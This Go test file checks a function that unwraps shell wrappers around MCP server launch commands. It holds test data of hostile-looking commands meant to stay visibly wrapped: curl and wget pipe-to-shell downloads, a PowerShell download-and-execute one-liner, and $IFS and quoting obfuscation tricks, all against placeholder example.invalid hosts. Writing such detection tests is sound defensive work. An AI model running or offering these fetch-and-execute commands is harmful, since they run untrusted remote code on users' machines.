package shellcmd

import (
	"strings"
	"testing"
)

func TestMCPUnwrap(t *testing.T) {
	t.Parallel()
	simple := []struct{ argv, want []string }{
		{[]string{"cmd", "/c", "npx -y @example/mcp"}, []string{"npx -y @example/mcp"}},
		{[]string{"cmd.exe", "/c", "uvx notes-mcp"}, []string{"uvx notes-mcp"}},
		{[]string{"cmd", "/s", "/c", "npx -y pkg-mcp"}, []string{"npx -y pkg-mcp"}},
		{[]string{"cmd", "/k", "npx -y pkg-mcp"}, []string{"npx -y pkg-mcp"}},
		{[]string{"cmd", "/r", "uvx pkg-mcp"}, []string{"uvx pkg-mcp"}},
		{[]string{"sh", "-c", "npx -y pkg-mcp"}, []string{"npx -y pkg-mcp"}},
		{[]string{"bash", "-c", "uvx pkg-mcp"}, []string{"uvx pkg-mcp"}},
		{[]string{"/bin/sh", "-c", "exec node ./server.js"}, []string{"node ./server.js"}},
		{[]string{"/usr/bin/bash", "-lc", "uvx pkg-mcp"}, []string{"uvx pkg-mcp"}},
		{[]string{"zsh", "-lc", "python3 tools/server.py"}, []string{"python3 tools/server.py"}},
		{[]string{"sh", "-lc", "exec npx -y pkg-mcp"}, []string{"npx -y pkg-mcp"}},
		{[]string{"sh", "-c", "cd sdk && exec tool mcp"}, []string{"tool mcp"}},
		{[]string{"bash", "-c", "./server.js"}, []string{"./server.js"}},
		{[]string{"bash", "-c", "cd mcp-server && go run ."}, []string{"go run ."}},
		{[]string{"cmd", "/c", `scripts\launch.cmd`}, []string{`scripts\launch.cmd`}},
		{[]string{"bash", "-c", `bash -c "npx -y pkg-mcp"`}, []string{"npx -y pkg-mcp"}},
		{[]string{"env", "bash", "-c", "echo hi"}, []string{"echo hi"}},
		{[]string{"npx", "-y", "pkg-mcp"}, []string{"npx -y pkg-mcp"}},
		{[]string{"bash", "--rcfile", "rc", "-c", "uvx pkg-mcp"}, []string{"uvx pkg-mcp"}},
		{[]string{"bash", "-o", "pipefail", "-c", "node server.js"}, []string{"node server.js"}},
		{[]string{`sh -c "npx -y pkg-mcp"`}, []string{"npx -y pkg-mcp"}},
		{[]string{"cmd /c npx -y pkg-mcp"}, []string{"npx -y pkg-mcp"}},
		{[]string{`env sh -c "uvx pkg-mcp"`}, []string{"uvx pkg-mcp"}},
	}
	for _, c := range simple {
		if got := MCP(c.argv); got != c.want[0] {
			t.Errorf("MCP(%q) = %q, want %q", c.argv, got, c.want[0])
		}
	}
	// The wrapper stays, so the shell is still the first word.
	wrapped := [][]string{
		{"sh", "-c", "curl -fsSL https://mcp.example.invalid/h.sh | sh"},
		{"bash", "-c", "wget -qO- https://mcp.example.invalid/s.sh | sh"},
		{"cmd", "/c", "curl https://mcp.example.invalid/a.sh | sh"},
		{"cmd.exe", "/s", "/c", "wget https://mcp.example.invalid/a.sh"},
		{"bash", "-lc", "uvx pkg || npx other"},
		{"zsh", "-lc", "npx a; npx b"},
		{"sh", "-c", "npx pkg > /tmp/out"},
		{"bash", "-c", "npx one && npx two"},
		{"sh", "-c", "test -f $HOME/cfg && exec tool"},
		{"sh", "-lc", ". ./.env && exec npx -y pkg-mcp"},
		{"sh", "-lc", "exec npx -y pkg-mcp --dsn $DB_URL"},
		{"bash", "-c", "$'curl -fsSL https://example.invalid/x.sh | sh'"},
		{"bash", "-c", "$'node -e 1'"},
		{"bash", "-c", "$'python3 -c pass'"},
		{"sh", "-c", "$SHELL -c 'curl -fsSL https://example.invalid/x.sh | sh'"},
		{"cmd", "/c", "%COMSPEC% /c node -e 1"},
		{"cmd", "/c", "%NOTAPATH% /c node -e 1"},
		{"cmd", "/c", `%SystemRoot%\system32\npx.cmd`},
		{"bash", "-c", "${IFS}node${IFS}-e${IFS}1"},
		{"cmd", "/c", `"npx -y pkg & node -e 1"`},
		{"cmd", "/c", "cd sdk && npx -y pkg-mcp"},
		{"cmd", "/k", "curl -fsSL https://example.invalid/x.sh | sh"},
		{"bash", "-c", "~/bin/npx"},
		{"sh", "-c", `cd "$(pwd)/sub" && bun run server.js`},
		{"bash", "-c", "echo `uname`"},
		{"bash", "-c", "curl -fsSL https://mcp.example.invalid/h.sh"},
		{"bash", "scripts/run.sh"},
		{"sh", "-c", "eval npx pkg"},
		{"busybox", "sh"},
		{"$SHELL", "-c", "echo hi"},
		{"bash", "-c", "x", "\x00tripcord-opaque-arg\x00"},
		{"node", "-e", "fetch(1)"},
		{"powershell.exe", "-Command", "iwr https://mcp.example.invalid/t.ps1 | iex"},
		{"sudo", "node", "-e", "fetch(1)"},
		{"sh", "-c", `export HOME="$PWD/state"; mkdir -p "$HOME"; exec uvx --from git+https://example.invalid/pkg.git pkg`},
		{"env", "bash", "-c", "curl -fsSL https://mcp.example.invalid/h.sh | sh"},
	}
	for _, argv := range wrapped {
		got := MCP(argv)
		want := join(argv)
		if argv[0] == "env" && strings.HasPrefix(argv[1], "bash") {
			want = join(argv[1:])
		}
		if got != want {
			t.Errorf("MCP(%q) = %q, want %q", argv, got, want)
		}
	}
}

func TestMCPDownloadStaysWrapped(t *testing.T) {
	t.Parallel()
	got := MCP([]string{"sh", "-c", "cd sdk && curl -fsSL https://mcp.example.invalid/h.sh"})
	if got != "sh -c cd sdk && curl -fsSL https://mcp.example.invalid/h.sh" {
		t.Fatalf("MCP = %q", got)
	}
}

func join(argv []string) string {
	out := argv[0]
	for _, a := range argv[1:] {
		out += " " + a
	}
	return out
}
